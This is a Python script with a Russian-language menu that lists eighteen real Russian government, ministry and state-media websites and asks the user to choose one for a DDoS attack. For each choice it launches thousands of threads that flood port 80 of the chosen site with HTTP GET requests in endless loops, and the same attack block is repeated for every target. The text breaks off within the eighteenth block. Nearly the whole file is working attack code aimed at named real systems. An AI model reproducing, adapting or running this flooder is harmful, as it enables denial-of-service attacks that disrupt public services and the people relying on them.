import threading
import socket 
import sys,random
import time
import os

print("Российская Федерация\n1)Официальный сайт Президента России - http://kremlin.ru\n2)Правительство России - http://government.ru\n3)Портал государственных услуг - http://gosuslugi.ru\n4)Совет Федерации - http://council.gov.ru\n5)Государственная Дума Федерального Собрания РФ - http://duma.gov.ru\n6)Федеральный портал государственной службы и управленческих кадров - http://gossluzhba.gov.ru\n7)Портал государственных закупок РФ - http://zakupki.gov.ru\n8)Министерство юстиций РФ - http://zakon.scli.ru\n9)Минобороны РФ - https://stat.mil.ru\n10)МВД РФ - https://мвд.рф\n11)МИД РФ - https://mid.ru\n12)РИА Новости - https://ria.ru\n13)Первый канал - https://1tv.ru\n14)Russia Today - https://russian.rt.com\n15)Вести.Ru - https://vesti.ru\n16)Роспотребнадзор - https://rospotrebnadzor.ru\n17)Роскомнадзор - https://rkn.gov.ru\n18)ФСИН РФ - https://fsin.gov.ru/")
k = input("\nВыберите сайт для DDoS-атаки: ")

if k == '1':
    #os.system('cls')
    site = 'kremlin.ru'
    t = [None] *1000
    a = [None] *1000
    l = [None] *1000

    F = '\033[91m'
    E = '\033[0m'
    Z = '\033[32m'
    agent = []
    agent.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
    agent.append("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")
    agent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
    agent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
    data = '''
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: en-us,en;q=0.5
    Accept-Encoding: gzip,deflate
    Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
    Keep-Alive: 115
    Connection: keep-alive'''
    def dos():
	    while 1:
		    try:
			    s = socket.socket()
			    s.connect((site, 80))
			    packet = str("GET / HTTP/1.1\nHost: "+site+"\n\n User-Agent: "+random.choice(agent)+"\n"+data).encode('utf-8')
			    s.sendto(packet, (site, 80))	
			    s.send(packet)
			    print(Z+time.ctime(time.time()) + ' Send packages->'+site+E)
		    except socket.error:
			    print(F+'Site down'+E)
			    exit(1)
    def dos2():
	    while 1:
		    dos()

    for i in range(1000):
	    t[i] = threading.Thread(target=dos)
    for h in range(1000):
	    l[h] = threading.Thread(target=dos2)
    for k in range(1000):
	    t[k].start()
	    l[k].start()


if k == '2':
    site = 'government.ru'
    t = [None] *1000
    a = [None] *1000
    l = [None] *1000

    F = '\033[91m'
    E = '\033[0m'
    Z = '\033[32m'
    agent = []
    agent.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
    agent.append("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")
    agent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
    agent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
    data = '''
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: en-us,en;q=0.5
    Accept-Encoding: gzip,deflate
    Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
    Keep-Alive: 115
    Connection: keep-alive'''
    def dos():
	    while 1:
		    try:
			    s = socket.socket()
			    s.connect((site, 80))
			    packet = str("GET / HTTP/1.1\nHost: "+site+"\n\n User-Agent: "+random.choice(agent)+"\n"+data).encode('utf-8')
			    s.sendto(packet, (site, 80))	
			    s.send(packet)
			    print(Z+time.ctime(time.time()) + ' Send packages->'+site+E)
		    except socket.error:
			    print(F+'Site down'+E)
			    exit(1)
    def dos2():
	    while 1:
		    dos()

    for i in range(1000):
	    t[i] = threading.Thread(target=dos)
    for h in range(1000):
	    l[h] = threading.Thread(target=dos2)
    for k in range(1000):
	    t[k].start()
	    l[k].start()

if k == '3':
    site = 'gosuslugi.ru'
    t = [None] *1000
    a = [None] *1000
    l = [None] *1000

    F = '\033[91m'
    E = '\033[0m'
    Z = '\033[32m'
    agent = []
    agent.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
    agent.append("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")
    agent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
    agent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
    data = '''
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: en-us,en;q=0.5
    Accept-Encoding: gzip,deflate
    Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
    Keep-Alive: 115
    Connection: keep-alive'''
    def dos():
	    while 1:
		    try:
			    s = socket.socket()
			    s.connect((site, 80))
			    packet = str("GET / HTTP/1.1\nHost: "+site+"\n\n User-Agent: "+random.choice(agent)+"\n"+data).encode('utf-8')
			    s.sendto(packet, (site, 80))	
			    s.send(packet)
			    print(Z+time.ctime(time.time()) + ' Send packages->'+site+E)
		    except socket.error:
			    print(F+'Site down'+E)
			    exit(1)
    def dos2():
	    while 1:
		    dos()

    for i in range(1000):
	    t[i] = threading.Thread(target=dos)
    for h in range(1000):
	    l[h] = threading.Thread(target=dos2)
    for k in range(1000):
	    t[k].start()
	    l[k].start()

if k == '4':
    site = 'council.gov.ru'
    t = [None] *1000
    a = [None] *1000
    l = [None] *1000

    F = '\033[91m'
    E = '\033[0m'
    Z = '\033[32m'
    agent = []
    agent.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
    agent.append("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")
    agent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
    agent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
    data = '''
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: en-us,en;q=0.5
    Accept-Encoding: gzip,deflate
    Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
    Keep-Alive: 115
    Connection: keep-alive'''
    def dos():
	    while 1:
		    try:
			    s = socket.socket()
			    s.connect((site, 80))
			    packet = str("GET / HTTP/1.1\nHost: "+site+"\n\n User-Agent: "+random.choice(agent)+"\n"+data).encode('utf-8')
			    s.sendto(packet, (site, 80))	
			    s.send(packet)
			    print(Z+time.ctime(time.time()) + ' Send packages->'+site+E)
		    except socket.error:
			    print(F+'Site down'+E)
			    exit(1)
    def dos2():
	    while 1:
		    dos()

    for i in range(1000):
	    t[i] = threading.Thread(target=dos)
    for h in range(1000):
	    l[h] = threading.Thread(target=dos2)
    for k in range(1000):
	    t[k].start()
	    l[k].start()

if k == '5':
    site = 'duma.gov.ru'
    t = [None] *1000
    a = [None] *1000
    l = [None] *1000

    F = '\033[91m'
    E = '\033[0m'
    Z = '\033[32m'
    agent = []
    agent.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
    agent.append("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")
    agent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
    agent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
    data = '''
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: en-us,en;q=0.5
    Accept-Encoding: gzip,deflate
    Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
    Keep-Alive: 115
    Connection: keep-alive'''
    def dos():
	    while 1:
		    try:
			    s = socket.socket()
			    s.connect((site, 80))
			    packet = str("GET / HTTP/1.1\nHost: "+site+"\n\n User-Agent: "+random.choice(agent)+"\n"+data).encode('utf-8')
			    s.sendto(packet, (site, 80))	
			    s.send(packet)
			    print(Z+time.ctime(time.time()) + ' Send packages->'+site+E)
		    except socket.error:
			    print(F+'Site down'+E)
			    exit(1)
    def dos2():
	    while 1:
		    dos()

    for i in range(1000):
	    t[i] = threading.Thread(target=dos)
    for h in range(1000):
	    l[h] = threading.Thread(target=dos2)
    for k in range(1000):
	    t[k].start()
	    l[k].start()

if k == '6':
    site = 'gossluzhba.gov.ru'
    t = [None] *1000
    a = [None] *1000
    l = [None] *1000

    F = '\033[91m'
    E = '\033[0m'
    Z = '\033[32m'
    agent = []
    agent.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
    agent.append("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")
    agent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
    agent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
    data = '''
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: en-us,en;q=0.5
    Accept-Encoding: gzip,deflate
    Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
    Keep-Alive: 115
    Connection: keep-alive'''
    def dos():
        while 1:
            try:
                s = socket.socket()
                s.connect((site, 80))
                packet = str("GET / HTTP/1.1\nHost: "+site+"\n\n User-Agent: "+random.choice(agent)+"\n"+data).encode('utf-8')
                s.sendto(packet, (site, 80))    
                s.send(packet)
                print(Z+time.ctime(time.time()) + ' Send packages->'+site+E)
            except socket.error:
                print(F+'Site down'+E)
                exit(1)
    def dos2():
        while 1:
            dos()

    for i in range(1000):
        t[i] = threading.Thread(target=dos)
    for h in range(1000):
        l[h] = threading.Thread(target=dos2)
    for k in range(1000):
        t[k].start()
        l[k].start()

if k == '7':
    site = 'zakupki.gov.ru'
    t = [None] *1000
    a = [None] *1000
    l = [None] *1000

    F = '\033[91m'
    E = '\033[0m'
    Z = '\033[32m'
    agent = []
    agent.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
    agent.append("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")
    agent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
    agent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
    data = '''
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: en-us,en;q=0.5
    Accept-Encoding: gzip,deflate
    Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
    Keep-Alive: 115
    Connection: keep-alive'''
    def dos():
        while 1:
            try:
                s = socket.socket()
                s.connect((site, 80))
                packet = str("GET / HTTP/1.1\nHost: "+site+"\n\n User-Agent: "+random.choice(agent)+"\n"+data).encode('utf-8')
                s.sendto(packet, (site, 80))    
                s.send(packet)
                print(Z+time.ctime(time.time()) + ' Send packages->'+site+E)
            except socket.error:
                print(F+'Site down'+E)
                exit(1)
    def dos2():
        while 1:
            dos()

    for i in range(1000):
        t[i] = threading.Thread(target=dos)
    for h in range(1000):
        l[h] = threading.Thread(target=dos2)
    for k in range(1000):
        t[k].start()
        l[k].start()

if k == '8':
    site = 'zakon.scli.ru'
    t = [None] *1000
    a = [None] *1000
    l = [None] *1000

    F = '\033[91m'
    E = '\033[0m'
    Z = '\033[32m'
    agent = []
    agent.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
    agent.append("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")
    agent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
    agent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
    data = '''
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: en-us,en;q=0.5
    Accept-Encoding: gzip,deflate
    Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
    Keep-Alive: 115
    Connection: keep-alive'''
    def dos():
        while 1:
            try:
                s = socket.socket()
                s.connect((site, 80))
                packet = str("GET / HTTP/1.1\nHost: "+site+"\n\n User-Agent: "+random.choice(agent)+"\n"+data).encode('utf-8')
                s.sendto(packet, (site, 80))    
                s.send(packet)
                print(Z+time.ctime(time.time()) + ' Send packages->'+site+E)
            except socket.error:
                print(F+'Site down'+E)
                exit(1)
    def dos2():
        while 1:
            dos()

    for i in range(1000):
        t[i] = threading.Thread(target=dos)
    for h in range(1000):
        l[h] = threading.Thread(target=dos2)
    for k in range(1000):
        t[k].start()
        l[k].start()

if k == '9':
    site = 'stat.mil.ru'
    t = [None] *1000
    a = [None] *1000
    l = [None] *1000

    F = '\033[91m'
    E = '\033[0m'
    Z = '\033[32m'
    agent = []
    agent.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
    agent.append("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")
    agent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
    agent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
    data = '''
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: en-us,en;q=0.5
    Accept-Encoding: gzip,deflate
    Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
    Keep-Alive: 115
    Connection: keep-alive'''
    def dos():
        while 1:
            try:
                s = socket.socket()
                s.connect((site, 80))
                packet = str("GET / HTTP/1.1\nHost: "+site+"\n\n User-Agent: "+random.choice(agent)+"\n"+data).encode('utf-8')
                s.sendto(packet, (site, 80))    
                s.send(packet)
                print(Z+time.ctime(time.time()) + ' Send packages->'+site+E)
            except socket.error:
                print(F+'Site down'+E)
                exit(1)
    def dos2():
        while 1:
            dos()

    for i in range(1000):
        t[i] = threading.Thread(target=dos)
    for h in range(1000):
        l[h] = threading.Thread(target=dos2)
    for k in range(1000):
        t[k].start()
        l[k].start()

if k == '10':
    site = 'мвд.рф'
    t = [None] *1000
    a = [None] *1000
    l = [None] *1000

    F = '\033[91m'
    E = '\033[0m'
    Z = '\033[32m'
    agent = []
    agent.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
    agent.append("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")
    agent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
    agent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
    data = '''
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: en-us,en;q=0.5
    Accept-Encoding: gzip,deflate
    Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
    Keep-Alive: 115
    Connection: keep-alive'''
    def dos():
        while 1:
            try:
                s = socket.socket()
                s.connect((site, 80))
                packet = str("GET / HTTP/1.1\nHost: "+site+"\n\n User-Agent: "+random.choice(agent)+"\n"+data).encode('utf-8')
                s.sendto(packet, (site, 80))    
                s.send(packet)
                print(Z+time.ctime(time.time()) + ' Send packages->'+site+E)
            except socket.error:
                print(F+'Site down'+E)
                exit(1)
    def dos2():
        while 1:
            dos()

    for i in range(1000):
        t[i] = threading.Thread(target=dos)
    for h in range(1000):
        l[h] = threading.Thread(target=dos2)
    for k in range(1000):
        t[k].start()
        l[k].start()

if k == '11':
    site = 'mid.ru'
    t = [None] *1000
    a = [None] *1000
    l = [None] *1000

    F = '\033[91m'
    E = '\033[0m'
    Z = '\033[32m'
    agent = []
    agent.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
    agent.append("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")
    agent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
    agent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
    data = '''
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: en-us,en;q=0.5
    Accept-Encoding: gzip,deflate
    Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
    Keep-Alive: 115
    Connection: keep-alive'''
    def dos():
        while 1:
            try:
                s = socket.socket()
                s.connect((site, 80))
                packet = str("GET / HTTP/1.1\nHost: "+site+"\n\n User-Agent: "+random.choice(agent)+"\n"+data).encode('utf-8')
                s.sendto(packet, (site, 80))    
                s.send(packet)
                print(Z+time.ctime(time.time()) + ' Send packages->'+site+E)
            except socket.error:
                print(F+'Site down'+E)
                exit(1)
    def dos2():
        while 1:
            dos()

    for i in range(1000):
        t[i] = threading.Thread(target=dos)
    for h in range(1000):
        l[h] = threading.Thread(target=dos2)
    for k in range(1000):
        t[k].start()
        l[k].start()

if k == '12':
    site = 'ria.ru'
    t = [None] *1000
    a = [None] *1000
    l = [None] *1000

    F = '\033[91m'
    E = '\033[0m'
    Z = '\033[32m'
    agent = []
    agent.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
    agent.append("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")
    agent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
    agent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
    data = '''
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: en-us,en;q=0.5
    Accept-Encoding: gzip,deflate
    Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
    Keep-Alive: 115
    Connection: keep-alive'''
    def dos():
        while 1:
            try:
                s = socket.socket()
                s.connect((site, 80))
                packet = str("GET / HTTP/1.1\nHost: "+site+"\n\n User-Agent: "+random.choice(agent)+"\n"+data).encode('utf-8')
                s.sendto(packet, (site, 80))    
                s.send(packet)
                print(Z+time.ctime(time.time()) + ' Send packages->'+site+E)
            except socket.error:
                print(F+'Site down'+E)
                exit(1)
    def dos2():
        while 1:
            dos()

    for i in range(1000):
        t[i] = threading.Thread(target=dos)
    for h in range(1000):
        l[h] = threading.Thread(target=dos2)
    for k in range(1000):
        t[k].start()
        l[k].start()

if k == '13':
    site = '1tv.ru'
    t = [None] *1000
    a = [None] *1000
    l = [None] *1000

    F = '\033[91m'
    E = '\033[0m'
    Z = '\033[32m'
    agent = []
    agent.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
    agent.append("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")
    agent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
    agent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
    data = '''
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: en-us,en;q=0.5
    Accept-Encoding: gzip,deflate
    Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
    Keep-Alive: 115
    Connection: keep-alive'''
    def dos():
        while 1:
            try:
                s = socket.socket()
                s.connect((site, 80))
                packet = str("GET / HTTP/1.1\nHost: "+site+"\n\n User-Agent: "+random.choice(agent)+"\n"+data).encode('utf-8')
                s.sendto(packet, (site, 80))    
                s.send(packet)
                print(Z+time.ctime(time.time()) + ' Send packages->'+site+E)
            except socket.error:
                print(F+'Site down'+E)
                exit(1)
    def dos2():
        while 1:
            dos()

    for i in range(1000):
        t[i] = threading.Thread(target=dos)
    for h in range(1000):
        l[h] = threading.Thread(target=dos2)
    for k in range(1000):
        t[k].start()
        l[k].start()

if k == '14':
    site = 'russian.rt.com'
    t = [None] *1000
    a = [None] *1000
    l = [None] *1000

    F = '\033[91m'
    E = '\033[0m'
    Z = '\033[32m'
    agent = []
    agent.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
    agent.append("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")
    agent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
    agent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
    data = '''
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: en-us,en;q=0.5
    Accept-Encoding: gzip,deflate
    Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
    Keep-Alive: 115
    Connection: keep-alive'''
    def dos():
        while 1:
            try:
                s = socket.socket()
                s.connect((site, 80))
                packet = str("GET / HTTP/1.1\nHost: "+site+"\n\n User-Agent: "+random.choice(agent)+"\n"+data).encode('utf-8')
                s.sendto(packet, (site, 80))    
                s.send(packet)
                print(Z+time.ctime(time.time()) + ' Send packages->'+site+E)
            except socket.error:
                print(F+'Site down'+E)
                exit(1)
    def dos2():
        while 1:
            dos()

    for i in range(1000):
        t[i] = threading.Thread(target=dos)
    for h in range(1000):
        l[h] = threading.Thread(target=dos2)
    for k in range(1000):
        t[k].start()
        l[k].start()

if k == '15':
    site = 'vesti.ru'
    t = [None] *1000
    a = [None] *1000
    l = [None] *1000

    F = '\033[91m'
    E = '\033[0m'
    Z = '\033[32m'
    agent = []
    agent.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
    agent.append("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")
    agent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
    agent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
    data = '''
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: en-us,en;q=0.5
    Accept-Encoding: gzip,deflate
    Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
    Keep-Alive: 115
    Connection: keep-alive'''
    def dos():
        while 1:
            try:
                s = socket.socket()
                s.connect((site, 80))
                packet = str("GET / HTTP/1.1\nHost: "+site+"\n\n User-Agent: "+random.choice(agent)+"\n"+data).encode('utf-8')
                s.sendto(packet, (site, 80))    
                s.send(packet)
                print(Z+time.ctime(time.time()) + ' Send packages->'+site+E)
            except socket.error:
                print(F+'Site down'+E)
                exit(1)
    def dos2():
        while 1:
            dos()

    for i in range(1000):
        t[i] = threading.Thread(target=dos)
    for h in range(1000):
        l[h] = threading.Thread(target=dos2)
    for k in range(1000):
        t[k].start()
        l[k].start()

if k == '16':
    site = 'rospotrebnadzor.ru'
    t = [None] *1000
    a = [None] *1000
    l = [None] *1000

    F = '\033[91m'
    E = '\033[0m'
    Z = '\033[32m'
    agent = []
    agent.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
    agent.append("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")
    agent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
    agent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
    data = '''
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: en-us,en;q=0.5
    Accept-Encoding: gzip,deflate
    Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
    Keep-Alive: 115
    Connection: keep-alive'''
    def dos():
        while 1:
            try:
                s = socket.socket()
                s.connect((site, 80))
                packet = str("GET / HTTP/1.1\nHost: "+site+"\n\n User-Agent: "+random.choice(agent)+"\n"+data).encode('utf-8')
                s.sendto(packet, (site, 80))    
                s.send(packet)
                print(Z+time.ctime(time.time()) + ' Send packages->'+site+E)
            except socket.error:
                print(F+'Site down'+E)
                exit(1)
    def dos2():
        while 1:
            dos()

    for i in range(1000):
        t[i] = threading.Thread(target=dos)
    for h in range(1000):
        l[h] = threading.Thread(target=dos2)
    for k in range(1000):
        t[k].start()
        l[k].start()

if k == '17':
    site = 'rkn.gov.ru'
    t = [None] *1000
    a = [None] *1000
    l = [None] *1000

    F = '\033[91m'
    E = '\033[0m'
    Z = '\033[32m'
    agent = []
    agent.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
    agent.append("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")
    agent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
    agent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
    data = '''
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: en-us,en;q=0.5
    Accept-Encoding: gzip,deflate
    Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
    Keep-Alive: 115
    Connection: keep-alive'''
    def dos():
        while 1:
            try:
                s = socket.socket()
                s.connect((site, 80))
                packet = str("GET / HTTP/1.1\nHost: "+site+"\n\n User-Agent: "+random.choice(agent)+"\n"+data).encode('utf-8')
                s.sendto(packet, (site, 80))    
                s.send(packet)
                print(Z+time.ctime(time.time()) + ' Send packages->'+site+E)
            except socket.error:
                print(F+'Site down'+E)
                exit(1)
    def dos2():
        while 1:
            dos()

    for i in range(1000):
        t[i] = threading.Thread(target=dos)
    for h in range(1000):
        l[h] = threading.Thread(target=dos2)
    for k in range(1000):
        t[k].start()
        l[k].start()

if k == '18':
    site = 'fsin.gov.ru'
    t = [None] *1000
    a = [None] *1000
    l = [None] *1000

    F = '\033[91m'
    E = '\033[0m'
    Z = '\033[32m'
    agent = []
    agent.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
    agent.append("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")
    agent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
    agent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
    data = '''
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: en-us,en;q=0.5
